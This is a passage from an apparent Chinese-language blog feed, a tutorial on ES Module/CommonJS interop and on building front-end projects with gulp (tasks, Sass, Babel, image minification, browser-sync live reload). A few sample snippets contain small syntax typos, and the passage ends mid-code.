</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="built_in">module</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取默认成员和正常成员</span></span><br><span class="line"><span class="keyword">import</span> abc, &#123; name, age &#125; <span class="keyword">from</span> <span class="string">'./module.js'</span></span><br><span class="line"><span class="built_in">console</span>.log(name, age, abc)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接导出导入成员</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// button.js</span></span><br><span class="line"><span class="keyword">var</span> Button = <span class="string">'Button Component'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Button</span><br><span class="line"></span><br><span class="line"><span class="comment">// avatar.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> Avatar = <span class="string">'Avatar Component'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> Button &#125; <span class="keyword">from</span> <span class="string">'./button.js'</span></span><br><span class="line"><span class="keyword">export</span> &#123; Avatar &#125; <span class="keyword">from</span> <span class="string">'./avatar.js'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方模块都是导出默认成员</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">'lodash'</span></span><br><span class="line"><span class="keyword">import</span> &#123; camelCase &#125; <span class="keyword">from</span> <span class="string">'lodash'</span> <span class="comment">// 不正确</span></span><br></pre></td></tr></table></figure><h2 id="Polyfill"><a href="#Polyfill" class="headerlink" title="Polyfill"></a>Polyfill</h2><p><code>ie</code>浏览器不兼容<code>ES Modules</code></p><p>Polyfill 是一块代码（通常是 Web 上的 JavaScript），用来为旧浏览器提供它没有原生支持的较新的功能。</p><h2 id="ES-Module与CommonJS交互"><a href="#ES-Module与CommonJS交互" class="headerlink" title="ES Module与CommonJS交互"></a>ES Module与CommonJS交互</h2><p>在node原生环境中</p><ul><li>ES Modules中可以导入CommonJS模块</li><li>CommonJS中可以导入ES Modules模块</li><li>CommonJS始终只会导出一个默认成员</li><li>注意import不是解构对象</li></ul><p><code>es-module.mjs</code>    文件名要改成.mjs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES Module 中可以导入 CommonJS 模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mod <span class="keyword">from</span> <span class="string">'./commonjs.js'</span></span><br><span class="line"><span class="built_in">console</span>.log(mod)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能直接提取成员，注意 import 不是解构导出对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; foo &#125; <span class="keyword">from</span> <span class="string">'./commonjs.js'</span></span><br><span class="line"><span class="built_in">console</span>.log(foo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">'es module export value'</span></span><br></pre></td></tr></table></figure><p><code>commonjs.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CommonJS 模块始终只会导出一个默认成员</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  foo: <span class="string">'commonjs exports value'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.foo = <span class="string">'commonjs exports value'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能在 CommonJS 模块中通过 require 载入 ES Module</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mod = <span class="built_in">require</span>(<span class="string">'./es-module.mjs'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(mod)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 模块化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gulp构建工具</title>
      <link href="2020/09/01/%E6%95%B4%E7%90%86-gulp%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
      <url>2020/09/01/%E6%95%B4%E7%90%86-gulp%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是gulp</li><li>gulp初体验</li><li>压缩过程实现</li><li>构建实例</li><li>怎么实现热更新</li></ul><a id="more"></a> <h2 id="什么是gulp"><a href="#什么是gulp" class="headerlink" title="什么是gulp"></a>什么是gulp</h2><p><a href="http://gulpjs.com/" target="_blank" rel="noopener">gulpjs</a>是一个前端构建工具，与<a href="http://gruntjs.com/" target="_blank" rel="noopener">gruntjs</a>相比，gulpjs无需写一大堆繁杂的配置参数，API也非常简单，学习起来很容易，而且gulpjs使用的是nodejs中<a href="http://nodejs.org/api/stream.html" target="_blank" rel="noopener">stream</a>来读取和操作数据，其速度更快。 </p><p><strong>gulp：The streaming build system</strong></p><h2 id="gulp初体验"><a href="#gulp初体验" class="headerlink" title="gulp初体验"></a>gulp初体验</h2><p>初始一个项目文件夹叫<code>gulp</code>，使用<code>npm init</code>初始化<code>package.json</code>文件，然后使用<code>cnpm install -g gulp</code>安装</p><p>依赖，<code>code gulpfile.js</code>新建一个<code>gulpfile.js</code>文件，作为入口文件，示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exports.foo = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'foo task working~'</span>)</span><br><span class="line">  done() <span class="comment">// 标识任务完成</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.default = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'default task working~'</span>)</span><br><span class="line">  done() <span class="comment">// 标识任务完成</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'bar'</span>, done =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'bar working'</span>)</span><br><span class="line">  done()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别运行如下：</span></span><br><span class="line"><span class="comment">// gulp foo</span></span><br><span class="line"><span class="comment">// gulp</span></span><br><span class="line"><span class="comment">// gulp bar</span></span><br></pre></td></tr></table></figure><h3 id="组合任务（串行，并行）"><a href="#组合任务（串行，并行）" class="headerlink" title="组合任务（串行，并行）"></a>组合任务（串行，并行）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; series, parallel &#125; = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> task1 = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'task1'</span>)</span><br><span class="line">    done()</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> task2 = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'task2'</span>)</span><br><span class="line">    done()</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> task3 = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'task3'</span>)</span><br><span class="line">    done()</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.foo = series(task1, task2, task3)   <span class="comment">// 串行</span></span><br><span class="line">exports.bar = parallel(task1, task2, task3) <span class="comment">// 并行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 gulp foo, gulp bar</span></span><br></pre></td></tr></table></figure><h3 id="gulp处理异步任务"><a href="#gulp处理异步任务" class="headerlink" title="gulp处理异步任务"></a>gulp处理异步任务</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">exports.callback = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'callback'</span>)</span><br><span class="line">  done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.callback_error = <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'callback error'</span>)</span><br><span class="line">  done(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'task failed'</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.promise = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise task'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.promise_error = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise task'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="string">'task failed'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> timeout = <span class="function"><span class="params">time</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.async = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> timeout(<span class="number">1000</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'async task'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理文件 stream</span></span><br><span class="line">exports.stream = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> readStream = fs.createReadStream(<span class="string">'package.json'</span>)</span><br><span class="line">  <span class="keyword">const</span> writeStream = fs.createWriteStream(<span class="string">'temp.txt'</span>)</span><br><span class="line">  readStream.pipe(writeStream)</span><br><span class="line">  <span class="keyword">return</span> readStream</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="压缩过程实现"><a href="#压缩过程实现" class="headerlink" title="压缩过程实现"></a>压缩过程实现</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; Transform &#125; = <span class="built_in">require</span>(<span class="string">'stream'</span>)</span><br><span class="line"></span><br><span class="line">exports.default = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 文件读取流</span></span><br><span class="line">  <span class="keyword">const</span> read = fs.createReadStream(<span class="string">'foo.css'</span>)</span><br><span class="line">  <span class="comment">// 文件写入流</span></span><br><span class="line">  <span class="keyword">const</span> write = fs.createWriteStream(<span class="string">'foo.min.css'</span>)</span><br><span class="line">  <span class="comment">// 文件转换流</span></span><br><span class="line">  <span class="keyword">const</span> transform = <span class="keyword">new</span> Transform(&#123;</span><br><span class="line">    transform: <span class="function">(<span class="params">chunk, encoding, callback</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 核心转换过程实现</span></span><br><span class="line">      <span class="comment">// chunk =&gt; 读取流中读取到的内容</span></span><br><span class="line">      <span class="keyword">const</span> input = chunk.toString()</span><br><span class="line">      <span class="keyword">const</span> output = input.replace(<span class="regexp">/\s+/g</span>, <span class="string">''</span>).replace(<span class="regexp">/\/\*.+?\*\//g</span>, <span class="string">''</span>)</span><br><span class="line">      callback(<span class="literal">null</span>, output)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  read</span><br><span class="line">    .pipe(transform) <span class="comment">// 转换</span></span><br><span class="line">    .pipe(write) <span class="comment">// 写入</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用gulp的API来简化"><a href="#利用gulp的API来简化" class="headerlink" title="利用gulp的API来简化"></a>利用gulp的API来简化</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; src, dest &#125; = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</span><br><span class="line"><span class="keyword">const</span> cleanCss = <span class="built_in">require</span>(<span class="string">'gulp-clean-css'</span>)</span><br><span class="line"><span class="keyword">const</span> rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>)</span><br><span class="line"></span><br><span class="line">exports.default = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> src(<span class="string">'src/*.css'</span>)</span><br><span class="line">    .pipe(cleanCss())</span><br><span class="line">    .pipe(rename(&#123; <span class="attr">extname</span>: <span class="string">'.min.css'</span> &#125;))</span><br><span class="line">    .pipe(dest(<span class="string">'dist'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构建实例"><a href="#构建实例" class="headerlink" title="构建实例"></a>构建实例</h2><p>现在有一个目录结构，如何实现构建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">── src</span><br><span class="line">    ├── about.html</span><br><span class="line">    ├── index.html</span><br><span class="line">    ├── assets</span><br><span class="line">        └── styles</span><br><span class="line">            ├── demo.scss</span><br><span class="line">            ├── main.scss</span><br><span class="line">            ├── _icons.scss</span><br><span class="line">            └── _variables.scss</span><br><span class="line">        └── scripts</span><br><span class="line">            ├── main.js</span><br><span class="line">        └── images</span><br><span class="line">            ├── logo.png</span><br><span class="line">            ├── a.svg</span><br></pre></td></tr></table></figure><ul><li>需要在src的同级目录下创建dist目录，且保留src的目录结构</li><li>scss编译成css</li><li>利用 babel 将 es6 转成 es5</li><li>png，svg图片进行压缩要先</li><li>每次构建要先删除原有的dist</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; src, dest, parallel, series &#125; = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</span><br><span class="line"><span class="keyword">const</span> sass = <span class="built_in">require</span>(<span class="string">'gulp-sass'</span>) <span class="comment">// cnpm install -D gulp-sass</span></span><br><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'gulp-babel'</span>)</span><br><span class="line"><span class="keyword">const</span> swig = <span class="built_in">require</span>(<span class="string">'gulp-swig'</span>) <span class="comment">// html模板引擎 cnpm install -D gulp-swig </span></span><br><span class="line"><span class="keyword">const</span> imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> del = <span class="built_in">require</span>(<span class="string">'del'</span>) <span class="comment">// 删除功能的插件 cnpm install -D del</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> data = &#123; <span class="comment">// 模板数据</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> clean = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> del([<span class="string">'dist'</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> style = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> src(<span class="string">'src/assets/styles/*.scss'</span>, &#123; <span class="attr">base</span>: <span class="string">'src'</span> &#125;) <span class="comment">// base 基准目录</span></span><br><span class="line">    .pipe(sass())</span><br><span class="line">    .pipe(dest(<span class="string">'dist'</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> src(<span class="string">'src/assets/scripts/*.js'</span>, &#123; <span class="attr">base</span>: <span class="string">'src'</span> &#125;)</span><br><span class="line">    .pipe(babel(&#123; <span class="attr">presets</span>: [<span class="string">'@babel/preset-env'</span>] &#125;)) <span class="comment">//babel只是平台，需要安装</span></span><br><span class="line">.pipe(dest(<span class="string">'dist'</span>))                             <span class="comment">// @babel/core 和 @babel/preset-env</span></span><br><span class="line">&#125;                </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> page = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> src(<span class="string">'src/*.html, &#123; base: '</span>src<span class="string">' &#125;）</span></span><br><span class="line"><span class="string">         .pipe(swig(&#123; data &#125;))</span></span><br><span class="line"><span class="string">     .pipe(dest('</span>dist<span class="string">'))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const image = () =&gt; &#123;</span></span><br><span class="line"><span class="string">     return src('</span>src/assets/images<span class="comment">/**', &#123; base: 'src' &#125;)</span></span><br><span class="line"><span class="comment">         .pipe(imagemin())</span></span><br><span class="line"><span class="comment">     .pipe(dest('dist'))</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// public目录的拷贝</span></span><br><span class="line"><span class="comment">const extra = () =&gt; &#123;</span></span><br><span class="line"><span class="comment">  return src('public/**', &#123; base: 'public' &#125;)</span></span><br><span class="line"><span class="comment">    .pipe(dest('dist'))</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">const compile = parallel(style, script, page, image) // compile只执行src的处理</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">const build = series(clean, parallel(compile, extra)) // 先删除</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">module.exports = &#123;</span></span><br><span class="line"><span class="comment">  compile,</span></span><br><span class="line"><span class="comment">  build</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="插件越来越多怎么办"><a href="#插件越来越多怎么办" class="headerlink" title="插件越来越多怎么办"></a>插件越来越多怎么办</h3><p><code>cnpm install -D gulp-load-plugins</code> 使用这个插件自动加载插件所有</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">const</span> loadPlugins = <span class="built_in">require</span>(<span class="string">'gulp-load-plugins'</span>)</span><br><span class="line"><span class="keyword">const</span> plugins = loadPlugins()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> style = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> src(<span class="string">'src/assets/styles/*.scss'</span>, &#123; <span class="attr">base</span>: <span class="string">'src'</span> &#125;) </span><br><span class="line">    .pipe(plugins.sass()) <span class="comment">// 所有插件使用plugin.sass()去使用</span></span><br><span class="line">    .pipe(dest(<span class="string">'dist'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="怎么实现热更新"><a href="#怎么实现热更新" class="headerlink" title="怎么实现热更新"></a>怎么实现热更新</h2><ul><li>会自动打开浏览器</li><li>修改<code>dist</code>下的文件，页面会自动更新</li></ul><hr><p>安装<code>browser-sync</code>插件：<code>cnpm install -D browser-sync</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js中增加以下内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browserSync = <span class="built_in">require</span>(<span class="string">'browser-sync'</span>)</span><br><span class="line"><span class="keyword">const</span> bs = browserSync.create()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> serve = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  bs.init(&#123;</span><br><span class="line">    notify: <span class="literal">false</span>,</span><br><span class="line">    files: <span class="string">'dist/**'</span>,    <span class="comment">// 热更新文件</span></span><br><span class="line">    port: <span class="number">2080</span>,</span><br><span class="line">    server: &#123;</span><br><span class="line">      baseDir: <span class="string">'dist'</span>    <span class="comment">// 基准目录</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  compile,</span><br><span class="line">  build,</span><br><span class="line">  serve  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="怎么实现修改src下面的文件，自动执行编译过程，再更新到页面"><a href="#怎么实现修改src下面的文件，自动执行编译过程，再更新到页面" class="headerlink" title="怎么实现修改src下面的文件，自动执行编译过程，再更新到页面"></a>怎么实现修改<code>src</code>下面的文件，自动执行编译过程，再更新到页面</h3><p>使用<code>watch</code>插件来监听，同时优化一下组合任务</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; src, dest, parallel, series, watch &#125; = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> serve = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  watch(<span class="string">'src/assets/styles/*.scss'</span>, style)</span><br><span class="line">  watch(<span class="string">'src/assets/scripts/*.js'</span>, script)</span><br><span class="line">  watch(<span class="string">'src/*.html'</span>, page)</span><br><span class="line">    </span><br><span class="line">  watch([</span><br><span class="line">    <span class="string">'src/assets/images/**'</span>,</span><br><span class="line">    <span class="string">'public/**'</span></span><br><span class="line">  ], bs.reload)</span><br><span class="line"></span><br><span class="line">  bs.init(&#123;</span><br><span class="line">    notify: <span class="literal">false</span>,</span><br><span class="line">    files: <span class="string">'dist/**'</span>,</span><br><span class="line">    server: &#123;</span><br><span class="line">      baseDir: [<span class="string">'dist'</span>, <span class="string">'src'</span>, <span class="string">'public'</span>] <span class="comment">// 起服务时按顺序找文件，dist找不到就找src,图片就在src中</span></span><br><span class="line">      routes: &#123;</span><br><span class="line">        <span class="string">'/node_modules'</span>: <span class="string">'node_modules'</span> <span class="comment">// html文件中</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译源文件到dist目录</span></span><br><span class="line"><span class="keyword">const</span> compile = parallel(style, script, page)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上线之前执行的任务：包括对图片的压缩等只需执行一次的任务</span></span><br><span class="line"><span class="keyword">const</span> build = series(clean, parallel(compile, image, extra))</span><br><span class="line"></span><br><span class="line"><span 